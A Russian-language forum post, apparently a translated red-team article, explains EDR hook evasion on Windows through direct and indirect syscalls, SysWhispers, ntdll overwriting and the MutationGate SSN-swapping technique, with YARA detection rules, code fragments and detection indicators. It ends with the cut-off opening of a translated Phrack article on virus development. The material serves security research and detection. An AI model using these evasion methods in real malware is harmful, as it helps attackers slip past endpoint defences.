Таким образом, мы можем напрямую инициировать системный вызов, вызывая определенную функцию. Однако этот подход имеет подозрительные индикаторы компрометации (IOCs):<br />
Жестко закодированная заглушка системного вызова может быть обнаружена, ее шаблон: 4c8bd1 c7c0&lt;DWORD&gt; 0f05c3.<br />
<br />
<b>Возможное правило Yara для обнаружения прямого системного вызова выглядит следующим образом:</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>rule direct_syscall
{
    meta:
        description = &quot;Hunt for direct syscall&quot;

    strings:
        $s1 = {4c 8b d1 48 c7 c0 ?? ?? ?? ?? 0f 05 c3}
        $s2 = {4C 8b d1 b8 ?? ?? ?? ?? 0F 05 C3}
    condition:
        #s1 &gt;=1 or #s2 &gt;=1
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797921000.png"
		data-src="https://osint42.org/attachments/1746797921000-png.355/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797921000-png.355/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797921000.png"
			title="1746797921000.png"
			width="1430" height="191" loading="lazy" />
	</div><br />
<br />
Хотя обойти этот шаблон тривиально, вставив некоторые инструкции, подобные NOP.<br />
<br />
У этого подхода есть недостаток: мы жестко закодируем номер системного вызова в исходном коде. Это плохо работает, когда в целевой организации используется несколько версий операционной системы, потому что SSN (System Service Numbers) различаются в разных версиях ОС.<br />
<br />
Набор инструментов Syswhisper решает эту проблему: Syswhisper 1 обнаруживает версию ОС хоста и выбирает правильный SSN. Syswhisper 2 динамически получает SSN во время выполнения. В любом случае, прямой системный вызов используется в этих подходах.<br />
<br />
Без пользовательской модификации заглушки системного вызова Syswhisper2 возможное правило Yara для обнаружения выглядит следующим образом:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>rule syswhisper2
{
    meta:
        description = &quot;Hunt for syswhisper2 generated asm code&quot;

    strings:
        $s1 = {58 48 89 4C 24 08 48 89 54 24 10 4C 89 44 24 18 4C 89 4C 24 20 48 83 EC 28 8B 0D ?? ?? 00 00 E8 ?? ?? ?? ?? 48 83 C4 28 48 8B 4C 24 08 48 8B 54 24 10 4C 8B 44 24 18 4C 8B 4C 24 20 4C 8B D1 0F 05 C3}
    condition:
        #s1 &gt;=1
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746797981151.png"
		data-src="https://osint42.org/attachments/1746797981151-png.356/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797981151-png.356/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797981151.png"
			title="1746797981151.png"
			width="1413" height="134" loading="lazy" />
	</div><br />
<br />
Помимо шаблона последовательностей байтов заглушки системного вызова, <b><u>выполнение инструкции syscall является ненормальным для легитимной программы</u></b>, т.е. системный вызов должен инициироваться внутри области памяти ntdll.dll.<br />
<br />
Например, при вызове Win32 API SleepEx в программе на C, мы можем заметить стек вызовов следующим образом: sleep!main -&gt; kernelbase!SleepEx -&gt; ntdll!NtDelayExecution -&gt; ntoskrnl!KeDelayExecutionThread.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797988931.png"
		data-src="https://osint42.org/attachments/1746797988931-png.357/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797988931-png.357/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797988931.png"
			title="1746797988931.png"
			width="615" height="562" loading="lazy" />
	</div><br />
<br />
Однако, если мы инициируем системный вызов напрямую, стек вызовов будет следующим: sleep!main -&gt; sleep!NtDelayExecution -&gt; ntoskrnl!KeDelayExecutionThread.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746797996506.png"
		data-src="https://osint42.org/attachments/1746797996506-png.358/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746797996506-png.358/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746797996506.png"
			title="1746797996506.png"
			width="620" height="570" loading="lazy" />
	</div><br />
<br />
<b><u>Легко обнаружить, что инструкция системного вызова инициируется в программе, а не в модуле ntdll.</u></b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798004479.png"
		data-src="https://osint42.org/attachments/1746798004479-png.359/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798004479-png.359/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798004479.png"
			title="1746798004479.png"
			width="684" height="195" loading="lazy" />
	</div><br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-kosvennyi-sistemnyi-vyzov"></a>Косвенный системный вызов&#8203;<a class="hoverLink" href="#-kosvennyi-sistemnyi-vyzov" title="Постоянная ссылка"></a></h3>Мы обсудили недостатки прямого системного вызова, поэтому мы хотим избежать выполнения системного вызова напрямую. Косвенный системный вызов является улучшением. Шаблон заглушки системного вызова очень похож на шаблон прямого системного вызова, однако, вместо непосредственного выполнения инструкции системного вызова, заглушка косвенного системного вызова использует безусловный переход для передачи выполнения по адресу инструкции системного вызова.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtAllocateVirtualMemory)
    jmp (address of a syscall instruction)
    ret
NtAllocateVirtualMemory ENDP</code></pre>
	</div>
</div><br />
Конечно, нам нужно получить действительный адрес для инструкции системного вызова. Предполагая, что NTAPI не захуклен, мы можем получить номер системного вызова по смещению 0x4 от начала функции, а инструкция системного вызова находится по смещению 0x12.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798016285.png"
		data-src="https://osint42.org/attachments/1746798016285-png.360/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798016285-png.360/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798016285.png"
			title="1746798016285.png"
			width="600" height="90" loading="lazy" />
	</div><br />
<br />
Однако это приводит нас к проблеме &quot;что было первым: курица или яйцо&quot;. Если NTAPI захуклен,<b><u> то его заглушка системного вызова не будет соответствовать шаблону заглушки системного вызова</u></b>, и, естественно, мы не сможем успешно извлечь SSN и адрес инструкции системного вызова.<br />
<br />
К счастью, учитывая, что системный вызов (syscall) является особым типом инструкции вызова, который не указывает напрямую адрес для перехода, а определяет адрес в пространстве ядра на основе SSN, все, что нам нужно сделать, это указать правильный SSN и соответствующие аргументы функции.<br />
<br />
Поэтому нам не обязательно получать адрес инструкции системного вызова в функции NtAllocateVirtualMemory. Мы можем выбрать незахукленный NTAPI, тот, который обычно не используется во вредоносном ПО, например, NtDrawText.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798024343.png"
		data-src="https://osint42.org/attachments/1746798024343-png.361/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798024343-png.361/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798024343.png"
			title="1746798024343.png"
			width="938" height="203" loading="lazy" />
	</div><br />
<br />
Хотя косвенные системные вызовы улучшили уклонение, продукты безопасности все еще могут обнаружить их на основе некоторых индикаторов компрометации (IOCs):<br />
Если использовать Syswhisper3 без пользовательских модификаций, хотя жестко закодированных байтов заглушки системного вызова меньше, все равно возможно найти шаблон последовательности байтов: 4c8bd1 41ff&lt;DWORD&gt; c3<br />
<br />
Возможное правило Yara для обнаружения выглядит следующим образом:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>rule syswhisper3
{
    meta:
        description = &quot;Hunt for syswhispe3 generated asm code&quot;

    strings:
        $s1 = {48 89 4c 24 08 48 89 54 24 10 4c 89 44 24 18 4c 89 4c 24 20 48 83 ec 28 b9 ?? ?? ?? ?? e8}
        $s2 = {48 83 c4 28 48 8b 4c 24 08 48 8b 54 24 10 4c 8b 44 24 18 4c 8b 4c 24 20 4c 8b d1}
    condition:
        #s1 &gt;=1 or #s2 &gt;=1
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746798032623.png"
		data-src="https://osint42.org/attachments/1746798032623-png.362/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798032623-png.362/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798032623.png"
			title="1746798032623.png"
			width="1368" height="401" loading="lazy" />
	</div><br />
<br />
Кроме того, хотя стек вызовов выглядит более легитимным, правило обнаружения может основываться на том факте, что адрес возврата находится в функции NtDrawText, в то время как выполненный системный вызов — это ntoskrnl!NtAllocateVirtualMemory.<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-perezapis-tekstovogo-segmenta-zagruzhennogo-ntdll"></a>Перезапись текстового сегмента загруженного NTDLL&#8203;<a class="hoverLink" href="#-perezapis-tekstovogo-segmenta-zagruzhennogo-ntdll" title="Постоянная ссылка"></a></h3>EDR перехватывает некоторые NTAPI, перезаписывая код в текстовом сегменте модуля ntdll. Поэтому, чтобы восстановить перехваченные функции, мы можем перезаписать текстовый сегмент загруженного ntdll.<br />
Для достижения этого необходимо выполнить несколько шагов:<br />
<ol>
<li data-xf-list-type="ol">Прочитать свежую копию ntdll. Мы можем прочитать её с диска, через Интернет, из директории KnownDLL и т.д.</li>
<li data-xf-list-type="ol">Изменить разрешение страницы с RX на RWX, так как текстовый сегмент по умолчанию не доступен для записи. Мы также можем использовать WriteProcessMemory или его NTAPI для перезаписи перехваченного кода.</li>
<li data-xf-list-type="ol">Скопировать текстовый сегмент из свежей копии в загруженный модуль.</li>
<li data-xf-list-type="ol">Восстановить разрешение страницы.</li>
</ol>Однако, у этого подхода есть несколько индикаторов компрометации (IOCs):<br />
<ul>
<li data-xf-list-type="ul">EDR может обнаружить, что хук был изменен, проверяя целостность загруженного модуля NTDLL.</li>
<li data-xf-list-type="ul">Мы используем перехваченные функции для выполнения вышеуказанных действий, что может вызвать срабатывание предупреждений.</li>
<li data-xf-list-type="ul">Область памяти с разрешением RWX является серьезным сигналом тревоги.</li>
</ul><h3 class="bbHeading"><a class="u-anchorTarget" name="-perezapis-perekhvachennykh-funktsii"></a>Перезапись перехваченных функций&#8203;<a class="hoverLink" href="#-perezapis-perekhvachennykh-funktsii" title="Постоянная ссылка"></a></h3>Вместо перезаписи всего текстового сегмента, мы можем выбрать перезапись необходимых функций, как при патчинге AmsiScanBuffer. Хотя это влечет за собой меньше изменений в загруженном модуле ntdll, индикаторы компрометации перезаписи текстового сегмента NTDLL все равно применимы к этому подходу.<br />
Существуют и другие подходы к обходу встроенного хука, но я не буду рассматривать их все. Эта статья (<a href="https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/" target="_blank" class="link link--external" rel="noopener">Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams - MDSec</a>) отлично объясняет общие подходы.<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-mutationgate"></a>MutationGate&#8203;<a class="hoverLink" href="#-mutationgate" title="Постоянная ссылка"></a></h3>MutationGate — это вариант косвенного системного вызова, новый подход к обходу встроенного хука EDR, использующий аппаратную точку останова для перенаправления системного вызова.<br />
<br />
MutationGate работает путем вызова незахукленного NTAPI и замены SSN незахукленного NTAPI на SSN захукленного NTAPI.<br />
<br />
Таким образом, системный вызов перенаправляется на захукленный NTAPI, и встроенный хук можно обойти без загрузки второго модуля ntdll или изменения байтов в пространстве памяти загруженного ntdll.<br />
<br />
<b>Репозиторий на GitHub: </b><a href="https://github.com/senzee1984/MutationGate" target="_blank" class="link link--external" rel="noopener">GitHub - senzee1984/MutationGate: Use hardware breakpoint to dynamically change SSN in run-time</a>.<br />
<br />
Как мы обсуждали ранее, EDR склонны устанавливать встроенные хуки для различных NTAPI, особенно тех, которые обычно используются в вредоносном ПО, таких как NtAllocateVirtualMemory. В то время как другие NTAPI, которые обычно не используются в вредоносном ПО, такие как NtDrawText, скорее всего, не имеют встроенных хуков. <b>Маловероятно, что EDR установит встроенные хуки для всех NTAPI.</b><br />
<br />
Предположим, что NTAPI NtDrawText не захуклен, в то время как NTAPI NtQueryInformationProcess захуклен.<br />
<br />
Шаги следующие:<br />
<br />
- Получить адрес NtDrawText. Это можно сделать, используя комбинацию GetModuleHandle и GetProcAddress или их пользовательскую реализацию через обход PEB.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>  pNTDT = GetFuncByHash(ntdll, 0xA1920265);    //NtDrawText hash
  pNTDTOffset_8 = (PVOID)((BYTE*)pNTDT + 0x8);    //Offset 0x8 from NtDrawText</code></pre>
	</div>
</div><br />
- Подготовьте аргументы для NtQueryInformationProcess.<br />
<br />
- Установите аппаратную точку останова на адресе NtDrawText+0x8. Когда выполнение достигнет этого адреса, SSN NtDrawText будет сохранен в регистре RAX, но системный вызов еще не будет инициирован.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>0:000&gt; u 0x00007FFBAD00EB68-8
ntdll!NtDrawText:
00007ffb`ad00eb60 4c8bd1          mov     r10,rcx
00007ffb`ad00eb63 b8dd000000      mov     eax,0DDh
00007ffb`ad00eb68 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffb`ad00eb70 7503            jne     ntdll!NtDrawText+0x15 (00007ffb`ad00eb75)
00007ffb`ad00eb72 0f05            syscall
00007ffb`ad00eb74 c3              ret
00007ffb`ad00eb75 cd2e            int     2Eh
00007ffb`ad00eb77 c3              ret</code></pre>
	</div>
</div><br />
- Получите SSN NtQueryInformationProcess. Внутри обработчика исключений обновите регистр RAX значением SSN NtQueryInformationProcess. То есть, оригинальный SSN был заменен.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>...&lt;SNIP&gt;...
uint32_t GetSSNByHash(PVOID pe, uint32_t Hash)
{
    PBYTE pBase = (PBYTE)pe;
    PIMAGE_DOS_HEADER    pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS    pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    IMAGE_OPTIONAL_HEADER    ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;
    DWORD exportdirectory_foa = RvaToFileOffset(pImgNtHdrs, ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportdirectory_foa);    //Calculate corresponding offset
    PDWORD FunctionNameArray = (PDWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-&gt;AddressOfNames));
    PDWORD FunctionAddressArray = (PDWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-&gt;AddressOfFunctions));
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-&gt;AddressOfNameOrdinals));

    for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++)
    {
        CHAR* pFunctionName = (CHAR*)(pBase + RvaToFileOffset(pImgNtHdrs, FunctionNameArray[i]));
        DWORD Function_RVA = FunctionAddressArray[FunctionOrdinalArray[i]];
        if (Hash == ROR13Hash(pFunctionName))
        {
            void *ptr = malloc(10);
            if (ptr == NULL) {
                perror(&quot;malloc failed&quot;);
                return -1;
            }
            unsigned char byteAtOffset5 = *((unsigned char*)(pBase + RvaToFileOffset(pImgNtHdrs, Function_RVA)) + 4);
            //printf(&quot;Syscall number of function %s is: 0x%x\n&quot;, pFunctionName,byteAtOffset5);    //0x18
            free(ptr);
            return byteAtOffset5;
        }
    }
    return 0x0;
}
...&lt;SNIP&gt;...</code></pre>
	</div>
</div><br />
Поскольку мы вызвали NtDrawText, но с аргументами NtQueryInformationProcess, вызов должен был бы завершиться неудачей. Однако, так как мы изменили SSN, системный вызов выполняется успешно.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>fnNtQueryInformationProcess pNTQIP = (fnNtQueryInformationProcess)pNTDT;
  NTSTATUS status = pNTQIP(pi.hProcess, ProcessBasicInformation, &amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);</code></pre>
	</div>
</div><br />
В этом примере, SSN NtDrawText равен 0xdd, SSN NtQueryInformationProcess равен 0x19, адрес NtDrawText равен 0x00007FFBAD00EB60.<br />
Вызов производится по адресу NtDrawText, но с аргументами NtQueryInformationProcess. Поскольку SSN изменен с 0xdd на 0x19, системный вызов выполняется успешно.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798075115.png"
		data-src="https://osint42.org/attachments/1746798075115-png.363/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798075115-png.363/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798075115.png"
			title="1746798075115.png"
			width="1034" height="386" loading="lazy" />
	</div><br />
<br />
Давайте изменим код и снова поэкспериментируем с NtDelayExecution, учитывая, что нам будет легче наблюдать стек вызовов. Как и ожидалось, эти правила Yara, которые мы использовали ранее, не могут обнаружить никакой шаблон последовательности байтов.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798084566.png"
		data-src="https://osint42.org/attachments/1746798084566-png.364/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798084566-png.364/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798084566.png"
			title="1746798084566.png"
			width="1415" height="119" loading="lazy" />
	</div><br />
<br />
Проверьте стек вызовов: системный вызов инициируется из пространства памяти ntdll, что выглядит легитимным с этой точки зрения. Однако KeDelayExecutionThread ожидает NtDelayExecution в качестве соответствующего NTAPI, а не NtDrawText. Эта подсказка может быть использована как правило для обнаружения.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798093446.png"
		data-src="https://osint42.org/attachments/1746798093446-png.365/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798093446-png.365/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798093446.png"
			title="1746798093446.png"
			width="613" height="566" loading="lazy" />
	</div><br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-preimushchestva-i-obnaruzheniye"></a>Преимущества и обнаружение&#8203;<a class="hoverLink" href="#-preimushchestva-i-obnaruzheniye" title="Постоянная ссылка"></a></h3>MutationGate имеет свои преимущества, но его также возможно обнаружить. Если у вас есть другие идеи о преимуществах и способах обнаружения, пожалуйста, сообщите мне : )<br />
<h4 class="bbHeading"><a class="u-anchorTarget" name="-preimushchestva"></a>Преимущества&#8203;<a class="hoverLink" href="#-preimushchestva" title="Постоянная ссылка"></a></h4><ul>
<li data-xf-list-type="ul">Не загружается второй модуль ntdll</li>
<li data-xf-list-type="ul">Нет изменений в загруженном модуле ntdll</li>
<li data-xf-list-type="ul">Отсутствие пользовательской заглушки системного вызова и шаблона последовательности байтов</li>
<li data-xf-list-type="ul">Системный вызов инициируется в модуле ntdll, что выглядит легитимно</li>
</ul><h4 class="bbHeading"><a class="u-anchorTarget" name="-vozmozhnyye-sposoby-obnaruzheniya"></a>Возможные способы обнаружения&#8203;<a class="hoverLink" href="#-vozmozhnyye-sposoby-obnaruzheniya" title="Постоянная ссылка"></a></h4><ul>
<li data-xf-list-type="ul">Вызов AddVectoredExceptionHandler может выглядеть подозрительно в обычной программе</li>
<li data-xf-list-type="ul">Функция в ntoskrnl.exe не соответствует функции в модуле ntdll</li>
<li data-xf-list-type="ul">Инициированный системный вызов в безвредном NTAPI не должен ожидать SSN другого NTAPI</li>
</ul><h3 class="bbHeading"><a class="u-anchorTarget" name="-sravneniye-s-drugimi-pokhozhimi-podkhodami"></a>Сравнение с другими похожими подходами&#8203;<a class="hoverLink" href="#-sravneniye-s-drugimi-pokhozhimi-podkhodami" title="Постоянная ссылка"></a></h3>HWSyscall (<a href="https://github.com/Dec0ne/HWSyscalls" target="_blank" class="link link--external" rel="noopener">GitHub - Dec0ne/HWSyscalls: HWSyscalls is a new method to execute indirect syscalls using HWBP, HalosGate and a synthetic trampoline on kernel32 with HWBP.</a>) и TamperingSyscall (<a href="https://github.com/rad9800/TamperingSyscalls" target="_blank" class="link link--external" rel="noopener">GitHub - rad9800/TamperingSyscalls</a>) оба изобретательно используют аппаратные точки останова для обхода встроенных хуков, и оба этих подхода отличные.<br />
<br />
Хотя я не читал и не ссылался на эти два проекта во время разработки и выпуска MutationGate (после выпуска MutationGate, друг прислал мне ссылки на эти два проекта), действительно есть некоторые похожие техники или общие идеи. Я внимательно прочитал и исследовал их, и я составил таблицу для сравнения, как показано ниже.<br />
<br />
<div class="bbTable">
<table style='width: 100%'><tr><th>Подход</th><th>Вызов</th><th>Аргументы</th><th>SSN</th><th>Системный вызов</th></tr><tr><td>MutationGate</td><td>Безвредный NTAPI</td><td>Аргументы целевого NTAPI</td><td>SSN безвредного NTAPI -&gt; SSN целевого NTAPI</td><td>В безвредном NTAPI</td></tr><tr><td>HWSyscall</td><td>Целевой NTAPI</td><td>Аргументы целевого NTAPI</td><td>SSN целевого NTAPI после его получения</td><td>В ближайшем незахваченном NTAPI</td></tr><tr><td>TamperingSyscall</td><td>Целевой NTAPI</td><td>Подставные -&gt; Аргументы целевого NTAPI</td><td>SSN целевого NTAPI после прохождения проверки EDR</td><td>В целевом NTAPI</td></tr><tr><td>Косвенный системный вызов</td><td>Пользовательская ASM функция</td><td>Аргументы целевого NTAPI</td><td>SSN целевого NTAPI после его получения</td><td>В любом незахваченном NTAPI</td></tr></table>
</div><h3 class="bbHeading"><a class="u-anchorTarget" name="-"></a>&#8203;<a class="hoverLink" href="#-" title="Постоянная ссылка"></a></h3><h3 class="bbHeading"><a class="u-anchorTarget" name="-blagodarnosti-i-ssylki"></a>Благодарности и ссылки&#8203;<a class="hoverLink" href="#-blagodarnosti-i-ssylki" title="Постоянная ссылка"></a></h3>В период после того, как я был вдохновлен, разработал и выпустил MutationGate, следующие ресурсы были очень полезны для меня, и я благодарен их авторам.<br />
<br />
<a href="https://github.com/senzee1984/MutationGate" target="_blank" class="link link--external" rel="noopener">GitHub - senzee1984/MutationGate: Use hardware breakpoint to dynamically change SSN in run-time</a><br />
<br />
<a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/" target="_blank" class="link link--external" rel="noopener">SysWhispers is dead, long live SysWhispers!</a><br />
<br />
<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" class="link link--external" rel="noopener">GitHub - jthuraisamy/SysWhispers2: AV/EDR evasion via direct system calls.</a><br />
<br />
<a href="https://ethicalchaos.dev/2022/04/17/in-process-patchless-amsi-bypass/" target="_blank" class="link link--external" rel="noopener">In-Process Patchless AMSI Bypass - Ethical Chaos</a><br />
<br />
<a href="https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/" target="_blank" class="link link--external" rel="noopener">Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams - MDSec</a><br />
<br />
<a href="https://thewover.github.io/Dynamic-Invoke/" target="_blank" class="link link--external" rel="noopener">Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp; API Hooks)</a><br />
<br />
<a href="https://cyberwarfare.live/bypassing-av-edr-hooks-via-vectored-syscall-poc/" target="_blank" class="link link--external" rel="noopener">Bypassing AV/EDR Hooks via Vectored Syscall - POC - CWL : Advanced Cyber Attack &amp; Detection Learning Platform</a><br />
<br />
<a href="https://redops.at/en/blog/syscalls-via-vectored-exception-handling" target="_blank" class="link link--external" rel="noopener">Syscalls via Vectored Exception Handling - RedOps</a><br />
<br />
<a href="https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf" target="_blank" class="link link--external" rel="noopener">In-Process Patchless AMSI Bypass</a><br />
<br />
<a href="https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html" target="_blank" class="link link--external" rel="noopener">Silly EDR Bypasses and Where To Find Them – MalwareTech</a><br />
<br />
<a href="https://github.com/Dec0ne/HWSyscalls" target="_blank" class="link link--external" rel="noopener">GitHub - Dec0ne/HWSyscalls: HWSyscalls is a new method to execute indirect syscalls using HWBP, HalosGate and a synthetic trampoline on kernel32 with HWBP.</a><br />
<br />
<a href="https://github.com/rad9800/TamperingSyscalls" target="_blank" class="link link--external" rel="noopener">GitHub - rad9800/TamperingSyscalls</a><br />
<br />
<a href="https://github.com/RedTeamOperations/VEH-PoC" target="_blank" class="link link--external" rel="noopener">GitHub - RedTeamOperations/VEH-PoC</a></div>
						

							<h2>Разработка настоящего вируса в 2024 году</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746798186533.png"
		data-src="https://osint42.org/attachments/1746798186533-png.366/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798186533-png.366/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798186533.png"
			title="1746798186533.png"
			width="512" height="512" loading="lazy" />
	</div><br />
<br />
Перевод:<a href="http://phrack.org/issues/71/9.html#article" target="_blank" class="link link--external" rel="noopener">.:: Phrack Magazine ::.</a><br />
<br />
--[ Содержание<br />
<ol>
<li data-xf-list-type="ol">Введение</li>
<li data-xf-list-type="ol">Планирование вируса</li>
<li data-xf-list-type="ol">Проектирование вируса</li>
<li data-xf-list-type="ol">Создание вируса</li>
<li data-xf-list-type="ol">Решение проблем при разработке 5.1. Исходный дизайн неудачен 5.2. Антивирус ловит вирус</li>
<li data-xf-list-type="ol">Заключение</li>
<li data-xf-list-type="ol">Приветствия</li>
<li data-xf-list-type="ol">Ссылки</li>
<li data-xf-list-type="ol">Артефакты</li>
</ol><b>--[ 1. Введение</b><br />
<br />
Нет ничего более захватывающего, чем успешная полезная нагрузка.<br />
<br />
Легко забыть, занимаясь нашими тёмными искусствами — от написания вирусов до эксплуатации — что во всём, что мы делаем, мы создаём программное обеспечение.<br />
И оно становится сложным. Конечно, для shell-кода это всего лишь однострочная команда с NASM для создания бинарного блоба.<br />
Это совсем несложно. Но ведь shell-код куда-то встраивается, верно? Язык Cи не позволит вам просто объединить бинарные блобы в ваш код. (По крайней мере, до выхода стандарта C23.)<br />
<br />
И не всегда так просто, как кажется, просто приклеить ваш блоб к исполняемому файлу. А что, если вы хотите как-то зашифровать shell-код? А что, если другая программа должна работать с этим shell-кодом? И эта программа может быть полезной нагрузкой другой программы в цепочке! И это даже не учитывает автоматизацию, которую может потребовать ваш assembly payload, например, динамическую обфускацию.<br />
<br />
Наши тёмные искусства — это хаос управления проектами: фабрики payload-ов, матрёшка обфускации, множество движущихся частей, требующих изобретательности.<br />
Это не значит, что наши быстрые хаки не выполняют свою цель — выполняют. Но чаще всего они оптимизированы для скорости, а не для совместимости, поддерживаемости или переносимости. Хорошая система сборки, иногда жертвуя краткосрочной скоростью разработки, обеспечивает эти вещи.<br />
<br />
